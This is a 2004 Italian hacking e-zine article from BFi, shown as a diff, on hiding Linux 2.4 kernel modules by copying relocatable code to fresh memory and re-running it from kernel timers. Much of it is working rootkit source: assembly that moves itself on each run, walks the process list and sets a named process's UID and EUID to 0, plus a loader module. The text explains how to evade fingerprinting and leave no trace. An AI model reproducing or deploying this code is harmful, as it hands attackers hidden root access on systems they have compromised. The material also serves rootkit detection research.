@@ -1,0 +1,1092 @@
+==============================================================================
+--------------------[ BFi12-dev - file 11 - 30/03/2004 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini esclusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ DYNAMiC KERNEL iNFECTi0N - PART I: TiMER HiJACKiNG
+-----[ sgrakkyu <sgrakkyu@antifork.org>
+
+
+
+--[ Contents
+        1. Introduction
+        2. Hiding Trouble
+        3. Code Relocation Engine
+        4. Hidden Clock Entry-Point
+        5. Base-Address
+        6. Code Example
+        7. Consideration
+        8. Thanks
+        9. References
+
+
+--[ 1 - Introduction
+Chiunque abbia mai scritto un LKM che alteri/modifichi una qualsiasi routine a
+kernel-space, conosce benissimo le problematiche che si nascondono dietro
+l'occultamento di queste ultime e le varieta' di tecniche piu' o meno
+efficienti per individuarle.
+In questa prima parte sara' trattata una tecnica che permette di oltrepassare
+la maggior parte, se non la totalita', dei controlli su queste risorse usando
+un approccio dinamico e saranno presentati successivamente degli esempi.
+Il codice proposto gira su una generica box 80x86/UP con kernel 2.4.x.
+
+
+--[ 2 - Hiding Trouble
+Con le tecniche finora presentate e' piuttosto difficile nascondere in un
+modo efficiente il codice dell'LKM per diverse ragioni:
+
+1) Molte volte l'opcode injection viene fatto su "risorse facilmente
+   individuabili" (injection on syscall table, on IDT table ecc...)
+
+2) La presenza del modulo stesso deve essere nascosta (hijacking of
+   sys_query_module, sys_write, proc, __this_module ecc..)
+   (nonostante i vari approcci tentati, il nuovo codice puo' essere piu' o meno
+   facilmente scoperto: una volta rilocato ad un fixed-address (vedi
+   VMALLOC substitution..) c'e' sempre un modo per individuarlo)
+
+3) Function Hijacking with Middle-Opcode-Injection: anche questa tecnica,
+   seppur piu' "subdola", puo' essere facilmente scoperta con una attenta
+   analisi del .text segment del kernel effettuata tramite una normale
+   procedura di fingerprint sull'immagine stessa del kernel in memoria.
+   Per avere un'idea della "fragilita'" del function hijacking su dati statici
+   rimando ad un interessante tool sviluppato da twiz (twiz@antifork.org) [7]
+
+4) Un'altra problematica, sempre relativa al punto "3", e' quella che in molti
+   casi, anche quando il middle-opcode-injection viene effettuato fuori dal
+   .text segment (ad esempio Pointer-Redirection su dati dinamici) e' difficile
+   individuare la giusta locazioni senza avere accesso a una System.map
+   sincronizzata (anche avendo un ipotetico accesso a kmem ci vorrebbero
+   sofisticati mem-scanner per individuare in modo piu' o meno approssimato la
+   locazione precisa).
+   Un buon kernel-hack non dovrebbe mai aver bisogno della System.map
+   sincronizzata per funzionare bene.
+
+Queste sono alcune tra le principali problematiche (ce ne sono molte altre) che
+il nostro LKM puo' trovare dopo essere stato caricato.
+
+
+--[ 3 - Code Relocation Engine
+Prima di essere eseguito il codice del nostro LKM viene "rimappato" esattamente
+all'indirizzo ritornato dalla sys_create_module() e rilocato in base al suo
+nuovo base-address e rimarra` tale fino a che il modulo non verra' rimosso
+dalla sys_delete_module(), la quale liberera' la memoria che gli era stata
+dedicata.
+Solo dopo tutto cio' il sistema dara' effettivamente il controllo al codice
+stesso tramite la funzione registrata via module_init().
+In realta' tutta questa procedura e' molto piu' strutturata e complessa, a
+partire dalla rilocazione del codice alla gestione dei Symboli esportati; ma
+per ora non importa, visto che la gestione delle vmalloc areas e degli exported
+symbols esula dall'argomento (se siete interessati leggete il codice relativo
+alle syscall in questione).
+Il nostro scopo e' quello di creare del codice totalmente indipendente da
+quello inizialmente allocato (vedi sys_create_module) e di rilocarlo
+dinamicamente altrove in un nuovo base-random-address.
+La funzione principale del LKM dovra' allora individuare la parte del nostro
+codice che vogliamo occultare e copiarla altrove, rilocando per noi il codice,
+tenendo presente il nuovo indirizzo e aggiustando eventualmente ogni
+riferimento relativo ad altri dati precedentemente rilocati dalle funzioni di
+caricamento del modulo.
+
+
+Ci sono due metodi principali per fare tutto cio':
+
+1) copiare il codice e rilocare ogni singola istruzione relativa (relative
+   jump, relative call ....) tenendo conto del nuovo offset
+2) scrivere direttamente codice 100% rilocabile per evitare di doverlo fare
+   dopo
+
+La prima soluzione e' sicuramente piu' versatile e flessibile, ma nello stesso
+tempo bisogna o riscrivere le relocation-routine o appoggiarsi a quelle del
+kernel.
+Nonostante questo ho scelto di utlizzare il secondo approccio nel codice
+proposto per i seguenti motivi:
+
+1) come detto nell'introduzine e' sempre meglio avere meno riferimenti
+   possibili alle funzioni del kernel non direttamente esportate
+2) il codice d'esempio doveva risultare il piu' semplice possibile
+3) i problemi di rilocazione avrebbero dilungato eccessivamente l'articolo
+   entrando in dettagli implementativi non essenziali
+
+Per scrivere del codice totalmente rilocabile si devono tenere a mente alcuni
+accorgimenti:
+
+- utilizzare call e jump assoluti se i riferimenti sono fuori dalla nostra
+  porzione di codice
+- mantenere il piu' possibile tutti i dati all'interno dello stack in modo
+  da avere sempre riferimenti costanti ovunque sia il codice
+- se si necessita di accedere ai dati esterni e' conveniente riferircisi
+  con indirizzi assoluti magari appoggiandosi direttamente ai registri
+- usare funzioni inline dove possibile o far si' che il linker allinei
+  sequenzialmente le varie routines cosi' da poter (non sempre) lasciare
+  invariate anche le relative-call tra una funzione e l'altra
+- usare sempre, quando possibile, variabili locali e lavorare il piu'
+  possibile solo su quelle (stile load/store)
+
+Il pezzo di codice seguente e' un piccolo esempio che spiega in breve la
+distinzione tra relative e absolute call:
+
+// call.c
+#include <stdio.h>
+#include <unistd.h>
+int main(int argc, char *argv[])
+{
+        const char *string = "Come se fosse...\n";
+        ssize_t (*write_ptr) (int, const void *, size_t);
+        // normal relative call
+        write(2, string, strlen(string));
+
+        // absolute call via function pointer
+        write_ptr = &write;
+        write_ptr(2, string, strlen(string));
+        return 0;
+}
+
+
+try@test tmp $ gcc -c -o call.o call.c
+
+try@test tmp $ objdump -t call.o
+SYMBOL TABLE:
+00000000 l    df *ABS*  00000000 call.c
+00000000 l    d  .text  00000000
+00000000 l    d  .data  00000000
+00000000 l    d  .bss   00000000
+00000000 l    d  .rodata        00000000
+00000000 l    d  .comment       00000000
+00000000 g     F .text  00000069 main
+00000000         *UND*  00000000 strlen
+00000000         *UND*  00000000 write
+
+- write entry: *UND* --> non essendo ancora stato linkato alle libc il
+  riferimento a write e' sconosciuto
+
+try@test tmp $ objdump -r call.o
+call.o:     file format elf32-i386
+
+RELOCATION RECORDS FOR [.text]:
+OFFSET   TYPE              VALUE
+00000013 R_386_32          .rodata
+0000001e R_386_PC32        strlen
+00000035 R_386_PC32        write 
+--------------------------------------------------------------------------
+write entry at offset: 35 (relocation of a relavite call on .text segment)
+--------------------------------------------------------------------------
+0000003c R_386_32          write    
+--------------------------------------------------------------------------
+write entry at offset: 3c (generic relocation on .text segment)
+--------------------------------------------------------------------------
+00000047 R_386_PC32        strlen
+
+vedendo poi il disassemblato possiamo notare:
+
+try@test tmp $ objdump -d call.o
+.........
+.........
+  2d:   c7 04 24 02 00 00 00    movl   $0x2,(%esp,1)
+  34:   e8 fc ff ff ff          call   35 <main+0x35>
+  39:   c7 45 f8 00 00 00 00    movl   $0x0,0xfffffff8(%ebp)
+.........
+.........
+  5d:   8b 45 f8                mov    0xfffffff8(%ebp),%eax
+  60:   ff d0                   call   *%eax
+.........
+.........
+
+L'indirizzo al byte 35-38 "fc ff ff ff" verra' sotituito al momento del link
+con le libc con l'indirizzo relativo alla routine (in realta' in questo caso
+non viene sostituito direttamente con l'indirizzo della funzione
+corrispondente, ma verra' chiamata una routine per la gestione del lazy-binding
+delle shared lib, ma a noi non importa perche' il concetto rimane pur sempre lo
+stesso).
+
+Differente e' l'entry per la relocation dell'address "3c-3f" "00 00 00 00"
+infatti qui verra' memorizzato l'indirizzo assoluto della routine (vale il
+discorso sopra per il lazy-binding) che verra' poi messo in %eax per fare un
+absolute call (si nota anche la diversita' dell'opcode principale delle due
+call e8/ff ). [6]
+
+Per far capire meglio il concetto e vedere cosa avviene dopo la rilocazione
+ricompiliamo lo stesso stupido programmino linkandolo alle libc:
+
+try@test tmp$ gcc -o call call.c
+try@test tmp$ objdump -d call
+........
+ 8048395:       c7 04 24 02 00 00 00     movl   $0x2,(%esp,1)
+ 804839c:       e8 db fe ff ff                  call   804827c <_init+0x28>
+ 80483a1:       c7 45 f8 7c 82 04 08     movl   $0x804827c,0xfffffff8(%ebp)
+.......
+ 80483c5:       8b 45 f8                 mov    0xfffffff8(%ebp),%eax
+ 80483c8:       ff d0                    call   *%eax
+........
+
+Vediamo infatti qui che nel primo caso nella relative call mettiamo un
+indirizzo relativo alla posizione dove si trova la call stessa:
+"db fe ff ff" = 804827c - 80483a1 (Intel usa Little-endian).
+Nel secondo caso l'indirizzo assoluto viene caricato in %eax e poi passato
+alla absolute call ("7c 82 04 08", anche questo in Little-endian).
+
+
+Vediamo un piccolo esempio di come semplificare il tutto, senza utilizzare
+direttamente puntatori a funzione, tramite alcune comode macro e come poter
+gestire piccole moli di dati localmente in modo da non dover rilocare 
+riferimenti a dati globali oltre che alle call/jmp relative.
+
+- esempio di absolute function call per funzioni standard che accettano 2
+  parametri tramite stack: (quanto e' bello l'asm inline di gcc?:)
+
+#define CALL_2PARAM(func_addr, first_arg, second_arg, ret) \
+do { \
+	__asm__ __volatile__ ("push %2\n\t" \
+			      "push %1\n\t" \
+			      "call *%3\n\t" \
+			      "add $8, %%esp\n\t" \
+			      "movl %1, %0" \
+			      : "=m" (ret) \
+			      : "a" (first_arg), "b" (second_arg), "c"
+			      (func_addr) \
+			      ); \
+} while(0)
+
+il tutto e' "come se fosse":
+........
+........
+int (*call2_param)(void *, void*); call2_param = real_fuction_address;
+ret = call2_param(firts, second);  ... ecc...
+........
+........
+
+codice d'esempio: (prima di eseguirlo leggere le note relative al SELFSIZE)
+
+<-| timerhijack/try_reloc.c |->
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/slab.h>
+
+#define __LEN 0x10
+#define DYNAMIC_FUNC_SIZE 0x40 /* see NOTE above!! */
+
+#define __PRINTK 0xc011ebd0 /* CHANGE IT! use your exported symbol via /proc/ksyms */
+
+void *inject=NULL;
+
+void dynamic_function(void)
+{
+	char array[__LEN];
+	int (*generic_call)(const char *fmt, ...) = 
+				(int (*)(const char *fmt,...))__PRINTK;
+
+	/* e' stupido scritto cosi' ma rende l'idea di 
+	cosa intendo per LOCAL DATA :)) 
+	*/
+
+	/* Storing string "* Running.." */
+	*((int *)array + 0) = 0x2a3e313c;
+	*((int *)array + 1) = 0x6e755220;
+	*((int *)array + 2) = 0x676e696e;
+	*((int *)array + 3) = 0x000a2e2e;
+
+
+	generic_call(array);
+}
+
+static int my_func(void)
+{
+	int i;
+	printk(KERN_ALERT "* Reloc Example\n");
+	inject = kmalloc(DYNAMIC_FUNC_SIZE, GFP_KERNEL);
+	for(i=0; i<DYNAMIC_FUNC_SIZE; i++)
+		*((char *)inject + i) = *((char *)dynamic_function + i);
+
+	/* Call dynamic func */
+	__asm__ __volatile__ ("call *%0\n\t"
+			    :
+			    : "r"(inject)
+			   );
+	return 0;
+}
+
+static void my_func_release(void)
+{
+	printk(KERN_ALERT "* Freeing Reloc Function\n");
+	kfree(inject);
+	return;
+}
+
+module_init(my_func);
+module_exit(my_func_release);
+MODULE_LICENSE("GPL");
+<-X->
+
+root@test reloc# gcc -I/usr/src/linux/include -D__KERNEL__ -DMODULE -c \
+try_reloc.c  -Wall
+root@test reloc# insmod try_reloc.o
+* Reloc Example
+* Running..
+root@test reloc# rmmod try_reloc
+* Freeing Reloc Function
+root@test:~/lkm/reloc#
+
+N.B. 1) SELF-SIZE: ogni compilatore ottimizza a modo suo le varie routine, per
+questo abbiamo bisogno di una two-step compilation, prima per conoscere
+l'esatta lunghezza di "dynamic_function" (in byte) e poi, dopo aver modificato
+DYNAMIC_FUNC_SIZE, ricompilare di nuovo.
+In realta' basterebbe allocare spazio a sufficienza e poi scrivere del codice
+"abbastanza contenuto"... ma per questioni di ottimizzazzione e velocita' di
+duplicazione (come si vedra' dopo) e' meglio sapere a priori la lunghezza della
+funzione...
+
+Concludendo... e' meglio utilizzare dove possibile riferimenti e chiamate
+assolute a dati e procedure per avere il nostro codice il piu' indipendente
+possibile.
+Se il codice sara' 100% indipendente e totalmente rilocabile potremo muoverlo
+ovunque e avere sempre garanzia che questo in un modo o nell'altro verra'
+eseguito in modo corretto.
+Una volta spostato il nostro codice altrove potremo direttamente rimuovere il
+modulo senza lasciare (attenti ai log:) traccia.
+Il problema di come nascondere il codice e' stato risolto... ma come possiamo
+farlo interagire con il resto del sistema senza intaccare parti vitali e
+facilmente controllabili del kernel???
+
+
+--[ 4 Hidden Entry Point
+Ora il nostro codice puo' essere copiato ovunque...
+Ogni funzione e struttura dati esportata puo' essere piu' o meno facilmente
+controllata, fare function hijacking, come detto poco sopra non e' sempre
+una buona idea perche' un qualsisi fingerprint sul .text segment darebbe un
+chiaro allarme (TNX twiz).
+Per questo non possiamo appoggiarci a niente di tutto cio'... non possiamo
+andare a modificare niente di "statico"...
+Bisogna allora cercare un modo dinamico per far eseguire il nostro codice, ma
+nello stesso tempo non dare punti di riferimento... e cosa e' piu' dinamico
+dello stesso TEMPO che passa? (the stream of time?:)))
+
+- tutta la gestione del mondo esterno e' "temporizzata" nel kernel, dallo
+scheduling, alla gestione del motore del floppy, alla gestione dello stack di
+rete ecc...
+
+- molti device driver ad esempio utilizzano dei "kernel timer" per eseguire
+delle loro routine a tempi determinati e a volte serializzati a tempi
+costanti da un determinato evento
+
+Analizziamo ora come vengono gestiti gli eventi legati ai "TIMERS" nel kernel:
+- static timer (per chi voglia utilizzarli per un port su 2.2)
+- dynamic timer (quelli usati in questo articolo)
+
+I "dynamic timer", al contrario di quelli statici, vengono creati
+all'occorrenza e distrutti quando non servono piu'... non sono di numero
+limitato e hanno un sistema di chiamata che consente di passare dei dati alle
+routines registrate al momento dell'esecuzione.
+
+La struttura e':
+
+struct timer_list {
+	struct list_head list;
+	unsigned long expires;
+	unsigned long data;
+	void (*function) (unsigned long);
+};
+
+* list:  implementazione delle liste dal kernel 2.4 in poi (list.h) che collega
+  i vari timer tra di loro (la struttura della gestione dei timer e' 
+  piuttosto complessa... non vengono tutti linkati fra loro, ma solo quelli
+  che scadono in un determinato periodo, la struttura dettagliata di questi 
+  ultimi pero' non interessa direttamente al funzionamento del codice...
+  per chi e' interessato puo' leggere i sorgenti relativi: timer.h e timer.c e
+  relativi)
+
+* expires:  questo campo specifica quando il timer scade, il tempo e'
+  misurato come numero di "ticks" che sono passati da quando la macchina e'
+  stata accesa. (Attenzione: questo campo e' riferito ai ticks assoluti...
+  quindi dovete sempre aggiungere N ticks a quelli appena scaduti se volete
+  serializzare l'esecuzione della routine ad intervalli fissi)
+
+* function: questo campo contiene l'indirizzo della routine da chiamare quando
+  e' scaduto il tempo.
+
+Il sistema tiene traccia del tempo che passa in ticks (di solito impostato su
+queste macchine a 100HZ, 10 ms) e registra questo valore nella variabile
+globale esportata "jiffies".
+Ogni routine viene dichiarata "scaduta" quando "expires" < "jiffies" e viene
+quindi eseguita.
+
+Le funzioni principali sono:
+* init_timer(struct timer_list *) usata per inizializzare le timer_list struct
+* add_timer(struct timer_list *) usata per aggiungere timer_list structure al
+  timer-chain principale
+
+L'idea e' quella di creare una funzione che si auto-invochi sfruttando i
+dynamic timer in modo da poter avere del codice sempre in esecuzione sulla
+macchina target.
+Attenzione: il codice eseguito tramite dynamic timer viene eseguito senza un
+process-context definito, per cui le operazioni che si faranno dovranno seguire
+le stesse restrizioni del codice che gira a interrupt-context (no sleep, no
+resched, not directly user-space access ecc..)
+
+Ecco una semplice "snip":
+......
+......
+/* Starting Procedure.. */
+
+t = kmalloc(sizeof(struct timer_list) , GFP_ATOMIC);
+
+init_timer(t);
+t->expires = jiffies + FIRST_TIME;
+t->data = (unsigned int)t;
+t->function = clock_function;
+add_timer(t);
+.......
+.......
+void clock_function(unsigned long val)
+{
+	printk(KERN_ALERT "* Running: Data is: %x\n", val);
+	((struct timer_list *)val)->expires = jiffies + NEXT_TIME;
+	add_timer((struct timer_list *)val);
+
+	return;
+}
+.......
+.......
+
+root@test reloc# insmod timer_es.o
+* Running: Data is: 0xc2da9fc0
+* Running: Data is: 0xc2da9fc0
+* Running: Data is: 0xc2da9fc0
+* Running: Data is: 0xc2da9fc0
+.......
+.......
+
+root@test:~/lkm/reloc# rmmod timer_es
+
+In questo esempio la routine principale del LKM inserisce la funzione
+"clock_function" all'interno di una timer_list e inserisce la stessa nel
+timer-chain.
+Ogni volta che la routine viene eseguita reimposta la timer_list che gli viene
+passata come argomento e ri-registra la routine (ecco che cosi' abbiamo
+sfruttato l'argomento della nostra function call per passare la stessa
+timer_list: in implementazioni piu' problematiche sarebbe una buona cosa
+passare a questa routine l'indirizzo di una tabella globale precedentemente
+allocata con tutti i dati che possono servire alla routine... in modo da
+evitare rilocazione e avere cosi' invece un accesso relativo ai dati esterni a
+partire da un fixed-address (l'indirizzo della tabella)).
+
+Ora lo scopo di tutto questo e' chiaro: si combina codice rilocabile 100%
+appoggiandolo ai dynamic timer per avere codice praticamente "invisibile" che
+gira sulla macchina target (in realta' non si deve esagerare con le dimensioni
+del codice e la frequenza delle chiamate perche' sia veramente "invisibile"...
+ricordate che c'e' sempre il Time-Path Analysis (tnx vecna:)
+
+
+--[ 5 - Base Address
+Visto che siamo paranoici... e visto che effettivamente il numero dei dynamic
+timer su una box con un carico normale non e' poi cosi' vasto... per rendere
+ancora piu' nascosta la nostra routine, si puo' cambiare la sua posizione in
+memoria ogni volta che viene eseguita cosi' da rendere veramente impraticabile
+"quasi" qualsiasi analisi.
+La nostra funzione, essendo gia' rilocabile al 100%, non ha nessun problema ad
+essere eseguita sempre in posti diversi, ma rimane comunque un problema di
+tempistica:
+- se per qualche motivo di implementazione la nostra funzione deve essere
+  chiamata molto di frequente e il suo tempo di esecuzione non e' poi cosi'
+  breve... aggiungere anche un ulteriore overhead nella copia di se stessa 
+  a volte non e' proponibile.. fate qualche prova per vedere se e' fattibile; 
+  per l'esempio poi riportato non ha nessuna influenza viste le dimensioni 
+  (e soprattutto la insignificante frequenza) :)
+
+Lo schema proposto come esempio si basa su una struttura di questo tipo:
+
+ -------------------------  -
+| jmp on CODE		 |  |
+|------------------------|  ||	prologue code
+| address hardcored	 |  ||
+| (prev address to free) |  |
+|------------------------|  |
+| REPLICATION CODE	 | -
+| (injecting itself)	 | -
+| (free old function)	 |  |
+| (re-register itself)	 |  ||
+|------------------------|  ||	function core code
+|  REAL CODE		 |  ||
+|  (what you want:))	 |  |
+-------------------------- -
+
+- <Prologue Code> composto dallo start-jump, dall'"hardcored data" e da parte
+  del replication-code:
+       
+       * jmp: e' la prima istruzione della nostra routine, fa un salto relativo
+       di N byte verso la prima vera istruzione della nostra routine.
+       
+       * hardcored-data: in questa sezione di N byte si trovano tutti i dati
+       che servono alla nostra stessa routine.
+       
+       * first-call: come prima istruzione viene eseguita una call per salvare
+       nello stack il ret-address e individuare cosi' l'inizio della nostra
+       funzione (a differenza di alcuni shellcode ho preferito lasciare il
+       ret-address nello stack e accederci quando serve al posto di utilizzare
+       un approccio call/pop).
+
+
+- <Replication Code> composto dalla sezione di free/inject e di re-register:
+       
+       * inject: la parte introduttiva alla reale routine: si alloca altro 
+       spazio dove verra' injectata la funzione stessa
+       
+       * free: in questa altra parte, sempre introduttiva alla reale routine,
+       ci si preoccupa di liberare la memoria usata dalla routine precedente
+       
+       * re-register itself: la nuova funzione viene poi ri-registrata nel
+       timer-chain (N.B. per la prima esecuzione si alloca manualmente un
+       dummy-fake-buffer -> vedi module.c )
+
+       
+A questo punto avremo lo stack strutturato in questo modo:
+
+       top of stack
+       -------------
+       data-ptr           puntatore alla global-table (contiene nel nostro caso
+                          solo un ptr alla timer_list)
+       save-ret		  of external timer function
+       save-ret		  of internal firt-call
+       ebp
+       general reg save
+       general reg save
+       .....
+       .....
+       first-string      | 4 byte per contenere una signature (vedi dopo)
+       second-string     | eventuali altri 4 byte per la signature
+       new-addr	         new injected address (dove finira` la nostra funzione
+                         la prossima volta)
+       ret-addr	         l'address dove si trova la nostra routine (equivalente
+                         a call/pop/sub)
+       ......
+
+       N.B. l'indirizzo della precedente funzione e' invece hardcorato nella
+       funzione stessa (appena dopo il first-jmp).
+       Una variante a questo potrebbe benissimo essere l'utilizzo di altri
+       campi nella global table.
+
+- <Real Code>
+       * real function: eccoci finalmente nella parte piu' interessante:)
+       qui potete fare tutto quello che volete sempre ricordando di essere
+       fuori da process-context, attenti quindi a COSA, quando, e dove 
+       chiamate CHI:)))
+
+
+--[ 6 - Code Example
+Per comodita' ho diviso in due parti il codice: una prima parte per la
+routine stessa e una per il caricamento via LKM.
+Il codice d'esempio non fa altro che cercare un processo, identificato da
+una determinata signature, e modificare i classici UID/EUID.
+Per semplificare il tutto ho scelto come signature semplicemente il nome del
+processo (per semplicita' basta confrontare la comm[16] nella relativa
+task_struct con la signature storata nello stack).
+Infine e' presentato uno stupido processo userspace che non fa altro che
+attendere il tempo di esecuzione della routine + 1 ed eseguire una shell.
+
+<-| timerhijack/config_len.h |->
+#define SELF_SIZE 0x110    /* !!!! READ NOTE ABOVE! self-size of entry_code
+                              in inject */
+<-X->
+
+<-| timerhijack/inject.S |->
+/*
+ * Filename: inject.S
+ * Creation date: 1.09.2003
+ * Author: Oldani Massimiliano 'sgrakkyu' - sgrakkyu@antifork.org
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ */
+
+/* QUESTO CODICE E' VOLUTAMENTE SEMPLIFICATO, SE RITENETE CERTE ISTRUZIONI
+TROPPO "OSCENE" OTTIMIZZATE VOI:) */
+
+#include <linux/linkage.h>
+#include <asm/segment.h>
+#include "config_len.h"
+
+/* offset defines */
+#define RET_INTO_FUNC  0x04
+#define DATA 0x0c
+#define JMP_INSTR 0x02
+#define CALL_OFFSET 0x0b
+
+#define OFF_PROCESS_S_	-0x20
+
+#define OFF_DYN_ADDR_	-0x24
+#define OFF_RET_ADDR_	-0x28
+
+#define OFF_UID		0x22c
+#define OFF_EUID	0x228
+
+
+#define NEXT_TASK 0x48
+#define OFF_COMM 0x33a
+
+/* function addresses */
+#define ADD_TIMER__ 0xc01272b0
+#define PRINTK__ 0xc011ebd0
+#define KFREE__ 0xc0138790
+#define KMALLOC__ 0xc01386a0
+#define GFP_ATOMIC 0x20
+#define SELF_SIZE_ SELF_SIZE		/* NOTE: check for two-step compilation
+with config_len.h value */
+
+#define JIFFIES__ 0xc0492444
+#define INIT_TASK_UNION__ 0xc0432000
+#define TIME_EXEC 1000
+#define EXPIRES 0x8
+#define FUNCTION 0x10
+
+/* example string "sgk\0\0\0\0\0" */
+#define PROCESS_S_1 0x006b6773
+#define PROCESS_S_2 0x00000000
+
+ENTRY(entry_code)
+		jmp 3f
+		nop	/* space left to hardcore prev address */
+		nop
+		nop
+		nop
+3:		call 1f
+		ret	/*  ret that return control to timer handler */
+
+
+1:		pushl %ebp
+		movl %esp, %ebp
+
+		pushl %eax
+		pushl %ebx
+		pushl %ecx
+		pushl %edx
+		pushl %esi
+		pushl %edi
+
+		/* uses 8 byte from stack for signature 
+		(process-name in our scheme) string */
+		
+		pushl $PROCESS_S_2
+		pushl $PROCESS_S_1
+
+		/* uses other 8 byte needed by dyn_addr and ret_addr */
+		subl $0x8, %esp
+
+	       /* kmalloc: gets new mem to inject itself */
+
+/* "e' come se fossimo" in interrupt context... in realta' non siamo prorpio
+ * li' ma non importano i dettagli.. dovete
+ * rispettare le stesse regole e quindi attenzione a effettuare sempre
+ * allocazioni atomiche
+ */
+		movl $GFP_ATOMIC, %ebx
+		movl $SELF_SIZE, %ecx
+		movl $KMALLOC__, %eax
+		pushl %ebx
+		pushl %ecx
+		call *%eax
+		addl $0x8, %esp
+		movl %eax, OFF_DYN_ADDR_(%ebp)	/* saves dyn_addr */
+
+
+		movl RET_INTO_FUNC(%ebp), %eax
+		subl $CALL_OFFSET, %eax
+		movl %eax, OFF_RET_ADDR_(%ebp)	/* gets and saves its
+		entry-point */
+
+
+		addl $JMP_INSTR, %eax
+		movl (%eax), %esi		/* gets prev-address */
+
+		/* KFREE: free prev allocated mem */
+		push %esi
+		movl $KFREE__, %ebx
+		call *%ebx
+		addl $0x4, %esp
+
+		/* starts copying itself on dyn_addr */
+		movl OFF_DYN_ADDR_(%ebp), %eax
+		movl OFF_RET_ADDR_(%ebp), %ebx
+		xor %ecx, %ecx
+6:		cmp $SELF_SIZE, %ecx
+		je  5f
+		movb (%ecx, %ebx, 1), %dl
+		movb %dl, (%ecx, %eax, 1)
+		inc %ecx
+		jmp 6b
+
+
+
+		/* sets this address with new allocated mem to let 
+		next "kfree"  */
+
+5:		movl OFF_DYN_ADDR_(%ebp), %eax
+		addl $JMP_INSTR, %eax
+		movl OFF_RET_ADDR_(%ebp), %ebx
+		movl %ebx, (%eax)
+
+
+		/* re-sets new time struct */
+		movl DATA(%ebp), %esi
+		movl JIFFIES__, %eax
+		addl $TIME_EXEC, %eax
+		movl %eax, EXPIRES(%esi)
+		movl OFF_DYN_ADDR_(%ebp), %eax
+		movl %eax, FUNCTION(%esi)
+
+
+		/* here start real function */
+
+		/* find right process if it runs */
+		leal OFF_PROCESS_S_(%ebp), %edi
+		movl $INIT_TASK_UNION__, %esi
+8:		movl NEXT_TASK(%esi), %esi
+		cmp $INIT_TASK_UNION__, %esi
+		je 7f
+
+		/* get comm[16] address */
+		leal OFF_COMM(%esi), %edx
+		push %edi
+		push %edx
+
+
+		/* call hardcored strcmp */
+		call 9f
+		addl $0x8, %esp
+		cmp $0x0, %eax
+		jne 10f
+
+		/* here make your UID/EUID 0 */
+		movl $0x00, OFF_UID(%esi)
+		movl $0x00, OFF_EUID(%esi)
+
+10:		jmp 8b
+
+
+		/*ADD_TIMER:  add timer on timer_list */
+7:		movl DATA(%ebp), %esi
+		movl $ADD_TIMER__, %ebx
+		pushl %esi
+		call *%ebx
+		addl $0x4, %esp
+
+
+		/* reload register */
+		addl $0x10, %esp
+		popl %edi
+		popl %esi
+		popl %edx
+		popl %ecx
+		popl %ebx
+		popl %eax
+
+		popl %ebp
+
+		ret
+
+
+/* simple lame strcmp */
+
+9:		pushl %ebp
+		movl %esp, %ebp
+		pushl %ebx
+		pushl %ecx
+		pushl %edx
+
+
+		xor %ecx, %ecx
+		movl 0x8(%ebp), %ebx
+		movl 0xc(%ebp), %edx
+13:		movb (%ecx, %ebx, 1), %al
+		cmpb (%ecx, %edx, 1), %al
+		je 14f
+		movl $0xff, %eax
+		jmp 11f
+
+
+14:		cmpb $0x00, %al
+		je 12f
+		incl %ecx
+		jmp 13b
+
+
+12:		movl $0x00, %eax
+11:		popl %edx
+		popl %ecx
+		popl %ebx
+
+		pop %ebp
+		ret
+<-X->
+
+<-| timerhijack/module.c |->
+/*
+ * Filename: module.c
+ * Creation date: 10.09.2003
+ * Author: Oldani Massimiliano 'sgrakkyu' - sgrakkyu@antifork.org
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ */
+
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/slab.h>
+#include <linux/timer.h>
+#include "config_len.h"
+
+#define TIME_EXEC 1000
+#define SELF_SIZE_ SELF_SIZE /* SELF-SIZE of injected function */
+
+extern void entry_code(void);
+
+static int my_func(void)
+{
+	int i;
+	unsigned int addr;
+	void *inject;
+	struct timer_list *time_l = kmalloc(sizeof(struct timer_list),
+								GFP_ATOMIC);
+	printk(KERN_ALERT "* Reloc Example\n");
+	
+	printk(KERN_ALERT "* Creating inject initial space: 0x%x\n",
+		(unsigned int)(inject = kmalloc(SELF_SIZE_, GFP_ATOMIC)));
+	
+	printk(KERN_ALERT "* Crating dummy address to free: 0x%x\n",
+		addr =(unsigned int) kmalloc(SELF_SIZE_, GFP_ATOMIC));
+
+	for(i=0; i < SELF_SIZE_; i++) 
+		*((char *)inject + i) = *((char*)entry_code + i);
+
